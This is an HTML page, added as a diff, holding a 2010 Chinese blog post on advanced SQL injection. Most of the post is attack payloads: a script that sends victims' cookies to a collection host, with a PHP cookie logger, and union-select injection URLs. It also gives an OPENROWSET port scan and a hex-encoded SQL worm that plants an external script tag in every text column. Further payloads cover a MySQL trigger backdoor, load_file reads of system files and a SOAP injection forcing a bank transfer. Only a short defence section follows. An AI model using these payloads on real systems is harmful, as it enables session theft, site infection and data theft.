@@ -1,0 +1,800 @@
+<!DOCTYPE html>
+<html lang="zh-cn" itemscope itemtype="http://schema.org/WebPage">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <title>SQL注入攻击和深层攻击方式发掘 - Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+  
+
+<meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta name="MobileOptimized" content="width"/>
+<meta name="HandheldFriendly" content="true"/>
+
+
+<meta name="applicable-device" content="pc,mobile">
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+<meta name="mobile-web-app-capable" content="yes">
+
+<meta name="author" content="Nuclear&#39;Atk" /><meta name="description" content="SQL注入攻击和深层攻击方式发掘。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta name="keywords" content="SQL注入攻击和深层攻击方式发掘,Nuclear&#39;Atk,Nuclear&#39;Atk 个人博客,Nuclear&#39;Atk 文章." />
+
+
+
+<meta name="baidu-site-verification" content="GSIJv096Bu" />
+
+
+
+<meta name="generator" content="Hugo 0.82.0" />
+
+
+<link rel="canonical" href="https://lcx.cc/post/261/" />
+
+
+
+
+
+<link rel="icon" href="/favicon.ico" />
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/sass/jane.min.af20b78e95c84de86b00a0242a4a77bd2601700e1b250edf27537d957ac0041d.css" integrity="sha256-ryC3jpXITehrAKAkKkp3vSYBcA4bJQ7fJ1N9lXrABB0=" media="screen" crossorigin="anonymous">
+
+
+
+
+
+<meta property="og:title" content="SQL注入攻击和深层攻击方式发掘" />
+<meta property="og:description" content="SQL注入攻击和深层攻击方式发掘。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://lcx.cc/post/261/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2010-07-01T23:29:00&#43;08:00" />
+<meta property="article:modified_time" content="2010-07-01T23:29:00&#43;08:00" />
+
+<meta itemprop="name" content="SQL注入攻击和深层攻击方式发掘">
+<meta itemprop="description" content="SQL注入攻击和深层攻击方式发掘。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"><meta itemprop="datePublished" content="2010-07-01T23:29:00&#43;08:00" />
+<meta itemprop="dateModified" content="2010-07-01T23:29:00&#43;08:00" />
+<meta itemprop="wordCount" content="4168">
+<meta itemprop="keywords" content="SQL,攻击,注入,ASP,cookie,HTTP,IE,IP,Java,MAC,NDS,Net,PHP,POS,Web,XSS,程序,代码,端口,恶意,技术,漏洞,数据,数据库,搜索,讨论,网站,文件,系统,协议," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SQL注入攻击和深层攻击方式发掘"/>
+<meta name="twitter:description" content="SQL注入攻击和深层攻击方式发掘。这篇文章由Nuclear&#39;Atk所写，并发表于Nuclear&#39;Atk个人博客。"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+
+
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Nuclear'Atk</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+        
+      </li><li class="mobile-menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+        
+      </li>
+    
+
+    
+  </ul>
+</nav>
+
+
+  
+    
+
+
+
+
+
+
+  <link rel="stylesheet" href="/lib/photoswipe/photoswipe.min.css" />
+  <link rel="stylesheet" href="/lib/photoswipe/default-skin/default-skin.min.css" />
+
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+<div class="pswp__bg"></div>
+
+<div class="pswp__scroll-wrap">
+    
+    <div class="pswp__container">
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+      <div class="pswp__item"></div>
+    </div>
+    
+    <div class="pswp__ui pswp__ui--hidden">
+    <div class="pswp__top-bar">
+      
+      <div class="pswp__counter"></div>
+      <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+      <button class="pswp__button pswp__button--share" title="Share"></button>
+      <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+      <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+      
+      
+      <div class="pswp__preloader">
+        <div class="pswp__preloader__icn">
+          <div class="pswp__preloader__cut">
+            <div class="pswp__preloader__donut"></div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+      <div class="pswp__share-tooltip"></div>
+    </div>
+    <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+    </button>
+    <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+    </button>
+    <div class="pswp__caption">
+      <div class="pswp__caption__center"></div>
+    </div>
+    </div>
+    </div>
+</div>
+
+  
+
+  
+
+  
+
+  <header id="header" class="header container">
+    <div class="logo-wrapper">
+  <a href="/" class="logo">
+    
+      Nuclear'Atk
+    
+  </a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/">主页</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/post/">归档</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/tags/">标签</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/categories/">分类</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%8F%8B%E6%83%85%E9%93%BE%E6%8E%A5/">友链</a>
+          
+
+        
+
+      </li>
+    
+        <li class="menu-item">
+        
+          
+          
+            <a class="menu-item-link" href="https://lcx.cc/%E5%85%B3%E4%BA%8E/">关于</a>
+          
+
+        
+
+      </li>
+    
+
+    
+    
+
+    
+  </ul>
+</nav>
+
+  </header>
+
+  <div id="mobile-panel">
+    <main id="main" class="main bg-llight">
+      <div class="content-wrapper">
+        <div id="content" class="content container">
+          <article class="post bg-white">
+    
+    <header class="post-header">
+      <h1 class="post-title">SQL注入攻击和深层攻击方式发掘</h1>
+      
+      <div class="post-meta">
+        <time datetime="2010-07-01" class="post-time">
+          2010-07-01
+        </time>
+        <div class="post-category">
+            <a href="https://lcx.cc/categories/%E8%80%81%E7%B3%BB%E7%BB%9F%E5%86%85%E5%AE%B9/"> 老系统内容 </a>
+            <a href="https://lcx.cc/categories/sql/"> SQL </a>
+            <a href="https://lcx.cc/categories/%E6%94%BB%E5%87%BB/"> 攻击 </a>
+            <a href="https://lcx.cc/categories/%E6%B3%A8%E5%85%A5/"> 注入 </a>
+            
+          </div>
+        <span class="more-meta"> 约 4168 字 </span>
+          <span class="more-meta"> 预计阅读 9 分钟 </span>
+
+        
+        
+
+        
+        
+      </div>
+    </header>
+
+    
+    
+<div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content">
+    
+  </div>
+</div>
+
+    
+    <div class="post-content">
+      
+稍微整理了下，有点乱 <br />
+<FONT color=red>author:邪公子(evilboy)</FONT> <br />
+<STRONG>0x01 SQL注入攻击内部机理透视</STRONG> <br />
+&nbsp; &nbsp;&nbsp;&nbsp; <br />
+SQL注入攻击已经出现很长时间，给很多的网站带来了危害，而且貌似还在继续着。国内关于SQL注入的攻击方式貌似已经比较成熟的，像一些大型的网站，基本上都会很好的对SQL注入攻击进行防御，好象攻击和防御在平衡，如何突破这中平衡，是个很好的课题，正好应和了黑防的口号，在攻与防的对立中寻找突破。本文我们主要讨论SQL攻击深层一点的技术，讨论一些具备艺术性的注入技术。 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+SQL注入本质个人总结，SQL注入本质就是越权对数据库的操作。同时，个人认为SQL注入不一定仅仅局限与WEB系统，可能也会存在与软件和其他系统等等。常见的WEB型的SQL注入攻击就是通过客户对WEB的恶意操作，进行获取信息和恶意攻击。这里仅仅讨论该类。 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+如何艺术的实现SQL注入或者更有效的更大发挥其价值，是我们讨论的核心。首先，我们必须对特定数据库足够了解，才能更加的发挥其功能，而不仅仅局限与简单的and 1=1和and 1=2.对数据库的了解这个是相当必要的。否则永远局限与别人的攻击方式上。 <br />
+ <br />
+下面会通过介绍几种不是很常见的攻击方式，来充分的理解其含义和帮助我们更好的发挥SQL注入的艺术。 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+<STRONG>0x02 实例小谈SQL注入高级攻击方式</STRONG> <br />
+ <br />
+以下只是笔者见到的部分特别的SQL注入攻击技术，由于篇幅原因，所以选择以下几个予以说明，更多详情，希望能够专门建立一个类似的项目，来更加充分的总结和学习经验。 <br />
+ <br />
+SQL注入之XSS攻击 <br />
+ <br />
+国外称该类攻击为XFS，通过将javascript进行char(),带入sql语句中，抱错的时候，会造成char中字符解析，执行xss代码。当然这类攻击是有一定的局限性的，但是还是可以很好的利用的。 <br />
+ <br />
+&lt;SCRIPT&gt;alert('xss')&lt;/script&gt;，这是一个弹出xss的xss代码，首先我们需要将其进行char转换，然后好带入sql注入语句。 <br />
+转换后字符如下： <br />
+ASCII : 60 83 67 82 73 80 84 62 97 108 101 114 116 40 39 120 115 115 39 #41 60 47 115 99 114 105 112 116 62 <br />
+然后，我们通过将其带入SQL语句，使欺骗用户点击后弹出xss代码，当然，这里只是一个介绍，大家可以可以把他用的更邪恶。比如，窃取COOKIE及挂马等等。以下是cookie收集代码，使用方法： <br />
+&lt;SCRIPT&gt;location.href='http://www.yoursite.com/cookie.php?#cookie='+escape(document.cookie)&lt;/SCRIPT&gt; <br />
+&lt;?php <br />
+$cookies = $_GET["cookie"]; <br />
+if($cookies) <br />
+{ <br />
+$grab = fopen("grab.txt","a"); <br />
+fputs($grab, $cookies . "\r\n"); <br />
+fclose($grab); <br />
+} <br />
+?&gt; <br />
+XFS测试代码环境如下： <br />
+<FONT color=#0000ff>http://www.test.com/test.php?id=null+union+select+1</FONT>,2,3,4,5,char(60,83,67,82,73,80,84,62,97,108,101,114,116,40,39,120,115,115,39,41,60,47,115,99,114,105,112,116,62),7,8-- <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+SOAP注入 <br />
+简单对象访问协议（SOAP）是一种轻量的、简单的、基于 XML 的协议，它被设计成在 WEB 上交换结构化的和固化的信息。 SOAP 可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（ HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。它还支持从消息系统到远程过程调用（RPC）等大量的应用程序。 具体这里就不浪费笔墨了，大家可以百度下。表面上不属于SQL注入，但确实很有意思的一种攻击。包括XML插入XSS攻击，都是需要了解的。 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+注入soap 一个银行程序 POST /transfer.asp HTTP/1.0 Host: wahh-bank.com Content-Length: 65 FromAccount=18281008&amp;Amount=1430&amp;ToAccount=0844766&amp;Submit=Submit 在处理这个请求的过程中，应用程序在后端组件传送下面soap消息 &lt;soap:Envelope xmlns=http://www.w3.org/2001/12/soap-envelope&gt; &lt;soap:Body&gt; &lt;Account&gt; &lt;FromAccount&gt;18281008&lt;/FromAccount&gt; &lt;Amount&gt;1430&lt;/Amount&gt; &lt;ClearedFunds&gt;False&lt;/ClearFunds&gt; &lt;ToAccount&gt;0844766&lt;/ ToAccount&gt; &lt;/Account&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt; 应用程序逻辑确定没有足够资金转账时，将元素ClearedFunds设置为false，因此受到soap消息的组件将拒绝转账 如果应用程序处理它遇到的第一个CleraFunds元素，那么即使账户没有足够资金，也可以成功转账 POST /transfer.asp HTTP/1.0 Host: wahh-bank.com Content-Length: 65 FromAccount=18281008&amp;Amount=1430&lt;/Amount&gt;&lt;ClearedFunds&gt;True&lt;/ClearedFunds &gt;&lt;Amount&gt;1430&amp;ToAccount=0844766&amp;Submit=Submit&nbsp;&nbsp; <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+&nbsp; &nbsp; &nbsp; &nbsp; &lt;soap:Envelope xmlns=http://www.w3.org/2001/12/soap-envelope&gt; &lt;soap:Body&gt; &lt;Account&gt; &lt;FromAccount&gt;18281008&lt;/FromAccount&gt; &lt;Amount&gt;1430&lt;/Amount&gt;&lt;ClearedFunds&gt;True&lt;/ClearedFunds &gt;&lt;Amount&gt;1430&lt;/Amount&gt; &lt;ClearedFunds&gt;False&lt;/ClearFunds&gt; &lt;ToAccount&gt;0844766&lt;/ ToAccount&gt; &lt;/Account&gt; &lt;/soap:Body&gt; &lt;/soap:Envelope&gt;  <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+这样就实现了第一个ClearedFunds为TRUE,造成成功转帐。结合了网上的一个例子。 <br />
+包括XML的注入技术，貌似都是大牛们用，没见其他人杂谈过，我太孤陋寡闻。 <br />
+ <br />
+3.SQL注入实现端口扫描 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+我们可以通过一个SQL注入漏洞对一个IP或者网段进行端口扫描，当然这种攻击主要是SQL server数据库。 <br />
+例子：<FONT color=#0000ff>http://www.example.com/news.asp?id=1</FONT> union select * from openrowset('SQLoledb','uid=sa;pwd=;Network=DBMSSOCN;Address=10.10.10.12,80;timeout=5','select * from table')-- <br />
+如果成功连接10.10.10.12的80端口，将显示： <br />
+"General network error. Check your network documentation"或者"OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error." <br />
+连接错误，将显示SQL Server does not exist or access denied <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+SQL注入蠕虫 <br />
+ <br />
+通过SQL注入，我们可以实现蠕虫，对每个页面插入恶意代码，很邪恶，适用与SQL Server。 <br />
+ <br />
+例子： <br />
+';DECLARE%20@S%20NVARCHAR(4000);SET%20@S=CAST(0x4400450043004C004100520045002000400054002000760061007200630068006100720028003200350035 <br />
+&nbsp; &nbsp; 0029002C0040004300200076006100720063006800610072002800320035003500290020004400450043004C0041005200450020005400610062006C0065005F004300 <br />
+&nbsp; &nbsp; 7500720073006F007200200043005500520053004F005200200046004F0052002000730065006C00650063007400200061002E006E0061006D0065002C0062002E006E <br />
+&nbsp; &nbsp; 0061006D0065002000660072006F006D0020007300790073006F0062006A006500630074007300200061002C0073007900730063006F006C0075006D006E0073002000 <br />
+&nbsp; &nbsp; 6200200077006800650072006500200061002E00690064003D0062002E0069006400200061006E006400200061002E00780074007900700065003D0027007500270020 <br />
+&nbsp; &nbsp; 0061006E0064002000280062002E00780074007900700065003D003900390020006F007200200062002E00780074007900700065003D003300350020006F0072002000 <br />
+&nbsp; &nbsp; 62002E00780074007900700065003D0032003300310020006F007200200062002E00780074007900700065003D003100AS%20NVARCHAR(4000));EXEC(@S);-- <br />
+Decode这些代码，源代码如下： <br />
+ <br />
+&nbsp; &nbsp; DECLARE @T VARCHAR(255) <br />
+&nbsp; &nbsp; DECLARE @C VARCHAR(255) <br />
+ <br />
+&nbsp; &nbsp; DECLARE Table_Cursor CURSOR FOR <br />
+&nbsp; &nbsp; SELECT [A].[Name], [B].[Name] <br />
+&nbsp; &nbsp; FROM sysobjects AS [A], syscolumns AS [B] <br />
+&nbsp; &nbsp; WHERE [A].[ID] = [B].[ID] AND <br />
+&nbsp; &nbsp;  <br />
+&nbsp; &nbsp; [A].[XType] = 'U' /* Table (User-Defined) */ AND <br />
+&nbsp; &nbsp; ([B].[XType] = 99 /* NTEXT */ OR <br />
+&nbsp; &nbsp; [B].[XType] = 35 /* TEXT */ OR <br />
+&nbsp; &nbsp; [B].[XType] = 231 /* SYSNAME */ OR <br />
+&nbsp; &nbsp; [B].[XType] = 167 /* VARCHAR */) <br />
+&nbsp; &nbsp;  <br />
+&nbsp; &nbsp; OPEN Table_Cursor <br />
+&nbsp; &nbsp; FETCH NEXT FROM Table_Cursor INTO @T,@C  <br />
+&nbsp; &nbsp;  <br />
+&nbsp; &nbsp; WHILE (@@FETCH_STATUS = 0) <br />
+&nbsp; &nbsp;  <br />
+&nbsp; &nbsp; BEGIN <br />
+&nbsp; &nbsp; EXEC('UPDATE [' + @T + '] SET [' + @C + '] = RTRIM(CONVERT(VARCHAR, [' + @C + '])) + ''&lt;script src="http://www.fengnima.cn/k.js"&gt;&lt;/script&gt;''') <br />
+&nbsp; &nbsp; FETCH NEXT FROM Table_Cursor INTO @T, @C <br />
+&nbsp; &nbsp; END <br />
+&nbsp; &nbsp;  <br />
+&nbsp; &nbsp; CLOSE Table_Cursor <br />
+&nbsp; &nbsp; DEALLOCATE Table_Cursor <br />
+一个小程序。 <br />
+ <br />
+搜索框注入技术 <br />
+ <br />
+搜索框注入是基本SQL注入的简单升华，在某些情况同样是可以实现的，抓住本质，如何注入就看你怎么发挥了，所以，最主要的还是研究其本质，了解了本质，就会下不管什么方式，都是很好了解的，同样，针对类似的如登陆框注入等，都是可以的。 <br />
+ <br />
+以下是简单判断是否存在注入的方法。 <br />
+搜索keywords‘，如果出错的话，有90%的可能性存在漏洞；b.搜索 keywords%，如果同样出错的话，就有95%的可能性存在漏洞；c.搜索keywords% 'and 1=1 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=1）看返回的情况d.搜索keywords% 'and 1=2 and '%'='（这个语句的功能就相当于普通SQL注入的 and 1=2）看返回的情况,根据两次的返回情况来判断是不是搜索型文本框注入了  <br />
+ <br />
+剩下的就是手工注入了。 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+触发器攻击 <br />
+触发器（trigger）是个特殊的存储过程，它的执行不是由程序调用，也不是手工启动，而是由个事件来触发，比如当对一个表进行操作（insert，delete，update）时就会激活它执行。触发器经常用于加强数据的完整性约束和业务规则等。触发器可以从DBA_TRIGGERS，USER_TRIGGERS数据字典中查到。 <br />
+触发器可以查询其他表，而且可以包含复杂的SQL语句。它们主要用于强制服从复杂的业务规则或要求。例如：您可以根据客户当前的帐户状态，控制是否允许插入新订单。 <br />
+触发器也可用于强制引用完整性，以便在多个表中添加、更新或删除行时，保留在这些表之间所定义的关系。 <br />
+ <br />
+SQL SERVER的注入国内有很好的例子和工具了，mysql5版本后开始支持触发器，貌似国内看到MYSQL触发器用法的比较少，这里笔者给出个简单demo： <br />
+ <br />
+CREATE TRIGGER Ha0K AFTER UPDATE ON admin FOR&nbsp;&nbsp;EACH ROW SELECT '恶意代码' into&nbsp;&nbsp;outfile 恶意文件路径(如启动项);当更新admin表的时候就出发该后门，自动在规定的地方导出恶意文件，如shell等。  <br />
+ <br />
+7.SQL注入DOS攻击 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+这里就不多讲了，假如我们可以对loadfile,那就尝试loadfile，尝试消耗服务器数据库进程，类似CC刷数据库原理，均是通过数据库进程使CPU内存升高，形成拒绝服务。(当然得有load权限) <br />
+ <br />
+Loadfile攻击 <br />
+还是利用loadfile,不过这里是通过loadfile直接窃取系统机密文件，如以下代码： <br />
+ <br />
+实例：$q = "Select * FROM users WHERE id=$id;"; Users表中如果有5个字段：Id、Username、Password、Userdetail、Regtime。通过网页显示出来的用户资料信息是4个字段：Id、Username、Userdetail、Regtime如果Username，Userdetail是字符类型的通常我们就可以利用了它来构造。构造语句：选择一个不存在的ID，或是直接加上and 1=2造成Union Select语句，前面一条Select没有正常执行，后面一条Select正常，从而显示后面一条Select语句的值。Id参数: 1 and 1=2 union Select 1,1,1,loadfile(load_file(char(99,58,47,98,111,111,116,46,105,110,105)),1 这里Char(99,58,47,98,111,111,116,46,105,110,105)就是C:\boot.ini每个字符相对应的ASCII码。权限等级足够的话可以用读出c:\boot.ini。  <br />
+ <br />
+ <br />
+9.cookie注入攻击 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+Cookie注入，也是相当有意思的一种注入技术，貌似看到大家的理解主要在于asp上。 <br />
+ID=Request("ID") ，由于执行顺序为GET，POST，COOKIE，通常防注入只防了GET和POST，所以可以造成PASS。 <br />
+ <br />
+方法：在输入框中输入&nbsp; &nbsp;&nbsp;&nbsp;javascript:alert(document.cookie="id="+escape("123 and 1=1"));&nbsp; &nbsp;&nbsp;&nbsp;刷新页面,如果显示正常,可以再试下一步(如果不正常,就有可能也有过滤了) <br />
+javascript:alert(document.cookie="id="+escape("123 and 1=2"));刷新一下页面。&nbsp; &nbsp;&nbsp;&nbsp;如果不正常显示，这就表示有注入。 <br />
+ <br />
+SQL注入中获取数据的一些技巧 <br />
+ <br />
+这里参考了0dayjun的文章的介绍，上传shell的本质主要核心还是在于获取数据，只是更方便而已，所以，这里可以通过简单的技巧，是可以很简单的直接获取大量数据。 <br />
+ <br />
+详情，大家请参考0dayjun网站吧，这里就不占用笔墨了。 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+<STRONG>0x03 SQL防护措施</STRONG> <br />
+ <br />
+以上各种方法对环境都是有一定要求的，比如某些情况下只能适合myslq,或者ms sql等，具体看情况了。主要的核心还是大家对基础知识的了解，否则，就只能是个工具黑客了。其实，还有很多注入方法，这里就不多说了，怕占太多笔墨了，嘿嘿。 <br />
+&nbsp; &nbsp; &nbsp; &nbsp;  <br />
+SQL注入防护的方法很多，针对asp，比如neaao写的SQL过滤程序，直接包含进去就OK，但是，还是有些方式有可能bypass这些IDS过滤。当然，简单的是可以防护的。或者将变量用引号括住，适合php,最好对带入参数进行过滤，如数字型的，进行数据判断，还有关闭错误回显等。针对jsp的好象不是很多，但是也是存在注入漏洞的。牛人们对这方面的研究都烂了，咱就不说了，太丢人了。但是很多大站还是存在这些问题的哦，比如，前段时间sohu分站注入等，毕竟站大了，啥漏洞都会有贝。嘿嘿。 <br />
+ <br />
+<STRONG>0x04 小结</STRONG> <br />
+ <br />
+SQL注入攻击，我认为应该是不会结束的，还会不断持续，不断有新的方式出现展现其魅力。即便是程序方面做了防护，但是各个方面都有可能出问题，从而最终实现注入。本人对SQL注入研究刚开始而已，希望各牛人提意见，希望大家能够建一个项目，主要做SQL注入方面的，我想这样会对总结经验和探讨很有好处吧。
+    </div>
+
+    
+    
+<div class="post-copyright">
+  <p class="copyright-item">
+    <span class="item-title">文章作者</span>
+    <span class="item-content">Nuclear'Atk</span>
+  </p>
+  <p class="copyright-item">
+    <span class="item-title">上次更新</span>
+    <span class="item-content">
+      2010-07-01
+      
+    </span>
+  </p>
+  
+  <p class="copyright-item">
+    <span class="item-title">许可协议</span>
+    <span class="item-content"><a href="https://lcx.cc/" target="_blank">Nuclear'Atk（核攻击）网络安全实验室</a>版权所有，转载请注明出处。</span>
+  </p>
+</div>
+
+
+    
+    
+
+    <footer class="post-footer">
+      <div class="post-tags">
+          <a href="https://lcx.cc/tags/sql/">SQL</a>
+          <a href="https://lcx.cc/tags/%E6%94%BB%E5%87%BB/">攻击</a>
+          <a href="https://lcx.cc/tags/%E6%B3%A8%E5%85%A5/">注入</a>
+          <a href="https://lcx.cc/tags/asp/">ASP</a>
+          <a href="https://lcx.cc/tags/cookie/">cookie</a>
+          <a href="https://lcx.cc/tags/http/">HTTP</a>
+          <a href="https://lcx.cc/tags/ie/">IE</a>
+          <a href="https://lcx.cc/tags/ip/">IP</a>
+          <a href="https://lcx.cc/tags/java/">Java</a>
+          <a href="https://lcx.cc/tags/mac/">MAC</a>
+          <a href="https://lcx.cc/tags/nds/">NDS</a>
+          <a href="https://lcx.cc/tags/net/">Net</a>
+          <a href="https://lcx.cc/tags/php/">PHP</a>
+          <a href="https://lcx.cc/tags/pos/">POS</a>
+          <a href="https://lcx.cc/tags/web/">Web</a>
+          <a href="https://lcx.cc/tags/xss/">XSS</a>
+          <a href="https://lcx.cc/tags/%E7%A8%8B%E5%BA%8F/">程序</a>
+          <a href="https://lcx.cc/tags/%E4%BB%A3%E7%A0%81/">代码</a>
+          <a href="https://lcx.cc/tags/%E7%AB%AF%E5%8F%A3/">端口</a>
+          <a href="https://lcx.cc/tags/%E6%81%B6%E6%84%8F/">恶意</a>
+          <a href="https://lcx.cc/tags/%E6%8A%80%E6%9C%AF/">技术</a>
+          <a href="https://lcx.cc/tags/%E6%BC%8F%E6%B4%9E/">漏洞</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE/">数据</a>
+          <a href="https://lcx.cc/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/">数据库</a>
+          <a href="https://lcx.cc/tags/%E6%90%9C%E7%B4%A2/">搜索</a>
+          <a href="https://lcx.cc/tags/%E8%AE%A8%E8%AE%BA/">讨论</a>
+          <a href="https://lcx.cc/tags/%E7%BD%91%E7%AB%99/">网站</a>
+          <a href="https://lcx.cc/tags/%E6%96%87%E4%BB%B6/">文件</a>
+          <a href="https://lcx.cc/tags/%E7%B3%BB%E7%BB%9F/">系统</a>
+          <a href="https://lcx.cc/tags/%E5%8D%8F%E8%AE%AE/">协议</a>
+          
+        </div>
+
+      
+      <nav class="post-nav">
+        
+          <a class="prev" href="/post/262/">
+            
+            <i class="iconfont">
+              <svg  class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M691.908486 949.511495l75.369571-89.491197c10.963703-12.998035 10.285251-32.864502-1.499144-44.378743L479.499795 515.267417 757.434875 204.940602c11.338233-12.190647 11.035334-32.285311-0.638543-44.850487l-80.46666-86.564541c-11.680017-12.583596-30.356378-12.893658-41.662889-0.716314L257.233596 494.235404c-11.332093 12.183484-11.041474 32.266891 0.657986 44.844348l80.46666 86.564541c1.772366 1.910513 3.706415 3.533476 5.750981 4.877077l306.620399 321.703933C662.505829 963.726242 680.945807 962.528973 691.908486 949.511495z"></path>
+</svg>
+
+            </i>
+            <span class="prev-text nav-default">【漏洞】sohu发件人未验证漏洞</span>
+            <span class="prev-text nav-mobile">上一篇</span>
+          </a>
+        
+          <a class="next" href="/post/260/">
+            <span class="next-text nav-default">【转载】HDWiki百科程序后台拿webshell漏洞</span>
+            <span class="prev-text nav-mobile">下一篇</span>
+            
+            <i class="iconfont">
+              <svg class="icon" viewBox="0 0 1024 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="18" height="18">
+  <path d="M332.091514 74.487481l-75.369571 89.491197c-10.963703 12.998035-10.285251 32.864502 1.499144 44.378743l286.278095 300.375162L266.565125 819.058374c-11.338233 12.190647-11.035334 32.285311 0.638543 44.850487l80.46666 86.564541c11.680017 12.583596 30.356378 12.893658 41.662889 0.716314l377.434212-421.426145c11.332093-12.183484 11.041474-32.266891-0.657986-44.844348l-80.46666-86.564541c-1.772366-1.910513-3.706415-3.533476-5.750981-4.877077L373.270379 71.774697C361.493148 60.273758 343.054193 61.470003 332.091514 74.487481z"></path>
+</svg>
+
+            </i>
+          </a>
+      </nav>
+    </footer>
+  </article>
+
+  
+  
+
+  
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+    
+
+  
+
+        </div>
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="icon-links">
+  
+  
+    <a href="mailto:root@lcx.cc" rel="me noopener" class="iconfont"
+      title="email" >
+      <svg class="icon" viewBox="0 0 1451 1024" version="1.1"
+  xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+  width="36" height="36">
